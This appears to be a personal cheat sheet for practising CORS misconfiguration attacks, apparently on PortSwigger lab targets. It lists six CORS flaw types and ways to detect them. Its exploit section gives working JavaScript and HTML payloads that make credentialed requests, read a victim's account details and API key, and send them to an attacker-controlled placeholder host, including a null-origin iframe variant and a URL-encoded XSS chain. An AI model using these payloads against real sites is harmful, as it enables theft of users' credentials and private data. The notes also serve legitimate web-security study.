# CORS

## Types:

1. Server-generated ACAO header from client-specified Origin header
2. Errors parsing Origin headers
3. Whitelisted null origin value
4. Exploiting XSS via CORS trust relationships
5. Breaking TLS with poorly configured CORS
6. Intranets and CORS without credentials 
---

## How to find each type:

1. Server-generated ACAO header from client-specified Origin header
- Attempt to use a random origin in the `Origin` header.
- See if the origin is reflected in the  `Access-Allow-Control-Origin` header.
2. Errors parsing Origin headers
- See if you can use subdomains or domains that end with the whitelisted domain.
3. Whitelisted null origin value
- Put `null` in the origin header and see if it is reflected.
4. Exploiting XSS via CORS trust relationships
- Check to see if subdomains are allowed in the `Access-Allow-Control-Origin` header.
- If they are, see if there is XSS on these domains.
5. Breaking TLS with poorly configured CORS
- Check subdomains for vulnerabilities.
6. Intranets and CORS without credentials 
-
---

## How to exploit each type:

1. Server-generated ACAO header from client-specified Origin header
```js
<script>
  function getadmin() {
      var res = JSON.parse(this.response)
      fetch("https://<your-exploit>/accountdetails?" + res.apikey);
  }
  
  const request = new XMLHttpRequest();
  request.addEventListener("load", getadmin);
  request.open("GET", "https://<your-id>/accountdetails", true);
  request.withCredentials = true;
  request.send();
</script>
```
2. Errors parsing Origin headers
- If `normal-website.com` is ok then try `hackersnormal-website.com`.
3. Whitelisted null origin value
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://<your-id>/accountdetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var res = JSON.parse(this.response)
location = 'https://<your-exploit>/accountdetails?' + res.apikey;
};
</script>"></iframe>
```
4. Exploiting XSS via CORS trust relationships
- Use XSS with the first CORS exploit:
  ```html
  <script>
    location="http://subdomain/?param=xss
  </script>

  hackvertor to urlencode
  <@urlencode><script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<id>/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://<exploit>/accountDetails?key='+res.apikey;};</script><@/urlencode>

  Portswiggers solution:
  <script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<id>/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<exploit>/log?key='%2bthis.responseText; };%3c/script>
  ```
5. Breaking TLS with poorly configured CORS
- This attack involves the following steps:
  - The victim user makes any plain HTTP request.
  - The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
  - The victim's browser follows the redirect.
  - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
  - The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
  - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
  - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
6. Intranets and CORS without credentials 
-
---

## Other important notes:
- Look for the `Access-Allow-Control-Origin` header.
